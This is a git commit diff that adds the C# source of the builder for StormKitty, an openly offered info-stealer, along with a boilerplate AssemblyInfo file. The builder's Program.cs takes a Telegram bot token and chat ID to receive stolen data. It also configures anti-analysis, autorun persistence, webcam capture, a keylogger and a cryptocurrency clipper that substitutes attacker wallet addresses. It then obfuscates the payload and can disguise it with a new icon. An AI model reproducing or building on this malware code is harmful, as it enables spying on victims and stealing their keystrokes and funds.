120379d6a683146c3729c12c04bcafeca9411166
Imperator Vladimir <Shukumei@protonmail.com>
2020-08-11 13:52:08 +0300

    builder source code

---
+++ StormKitty/builder/StormKittyBuilder/Program.cs
@@ -0,0 +1,63 @@
+﻿/* 
+    Author : LimerBoy
+    Github : github.com/LimerBoy/StormKitty
+*/
+
+using System;
+
+namespace StormKittyBuilder
+{
+    class Program
+    {
+        [STAThreadAttribute]
+        static void Main(string[] args)
+        {
+            // Settings
+            string token = cli.GetStringValue("Telegram API token");
+            string chatid = cli.GetStringValue("Telegram chat ID");
+            // Test connection to telegram API
+            if (!telegram.SendMessage("✅ *StormKitty* builder connected successfully!", token, chatid))
+                cli.ShowError("Failed connect to telegram bot api!");
+            else
+                cli.ShowSuccess("Connected successfully!\n");
+
+            // Encrypt values
+            build.ConfigValues["Telegram API"] = crypt.EncryptConfig(token);
+            build.ConfigValues["Telegram ID"] = crypt.EncryptConfig(chatid);
+            // Installation
+            build.ConfigValues["AntiAnalysis"] = cli.GetBoolValue("Use anti analysis?");
+            build.ConfigValues["Startup"] = cli.GetBoolValue("Install autorun?");
+            build.ConfigValues["StartDelay"] = cli.GetBoolValue("Use random start delay?");
+            // Modules
+            if(build.ConfigValues["Startup"].Equals("1")) {
+                build.ConfigValues["WebcamScreenshot"] = cli.GetBoolValue("Create webcam screenshots?");
+                build.ConfigValues["Keylogger"] = cli.GetBoolValue("Install keylogger?");
+                build.ConfigValues["Clipper"] = cli.GetBoolValue("Install clipper?");
+            }
+            // Clipper addresses
+            if (build.ConfigValues["Clipper"].Equals("1"))
+            {
+                build.ConfigValues["ClipperBTC"] = cli.GetEncryptedString("Clipper : Your bitcoin address");
+                build.ConfigValues["ClipperETH"] = cli.GetEncryptedString("Clipper : Your etherium address");
+                build.ConfigValues["ClipperXMR"] = cli.GetEncryptedString("Clipper : Your monero address");
+                build.ConfigValues["ClipperXRP"] = cli.GetEncryptedString("Clipper : Your ripple address");
+                build.ConfigValues["ClipperLTC"] = cli.GetEncryptedString("Clipper : Your litecoin address");
+                build.ConfigValues["ClipperBCH"] = cli.GetEncryptedString("Clipper : Your bitcoin cash address");
+            }
+            // Build
+            string builded = build.BuildStub();
+            string confuzed = obfuscation.Obfuscate(builded);
+            // Select icon
+            if (System.IO.Directory.Exists("icons"))
+                if (cli.GetBoolValue("Do you want change file icon?") == "1")
+                {
+                    string icon = cli.GetIconPath();
+                    if (icon != null)
+                        IconChanger.InjectIcon(confuzed, icon);
+                }
+            // Done
+            cli.ShowSuccess("Obfuscated stub: " + confuzed + " saved.");
+            Console.ReadLine();
+        }
+    }
+}
---
+++ StormKitty/builder/StormKittyBuilder/Properties/AssemblyInfo.cs
@@ -0,0 +1,36 @@
+﻿using System.Reflection;
+using System.Runtime.CompilerServices;
+using System.Runtime.InteropServices;
+
+// Общие сведения об этой сборке предоставляются следующим набором
+// набора атрибутов. Измените значения этих атрибутов для изменения сведений,
+// связанные с этой сборкой.
+[assembly: AssemblyTitle("StormKittyBuilder")]
+[assembly: AssemblyDescription("")]
+[assembly: AssemblyConfiguration("")]
+[assembly: AssemblyCompany("")]
+[assembly: AssemblyProduct("StormKittyBuilder")]
+[assembly: AssemblyCopyright("Copyright ©  2020")]
+[assembly: AssemblyTrademark("")]
+[assembly: AssemblyCulture("")]
+
+// Установка значения False для параметра ComVisible делает типы в этой сборке невидимыми
+// для компонентов COM. Если необходимо обратиться к типу в этой сборке через
+// из модели COM задайте для атрибута ComVisible этого типа значение true.
+[assembly: ComVisible(false)]
+
+// Следующий GUID представляет идентификатор typelib, если этот проект доступен из модели COM
+[assembly: Guid("98075331-1f86-48c8-ae29-29da39a8f98b")]
+
+// Сведения о версии сборки состоят из указанных ниже четырех значений:
+//
+//      Основной номер версии
+//      Дополнительный номер версии
+//      Номер сборки
+//      Номер редакции
+//
+// Можно задать все значения или принять номера сборки и редакции по умолчанию 
+// используя "*", как показано ниже:
+// [assembly: AssemblyVersion("1.0.*")]
+[assembly: AssemblyVersion("1.0.0.0")]
+[assembly: AssemblyFileVersion("1.0.0.0")]
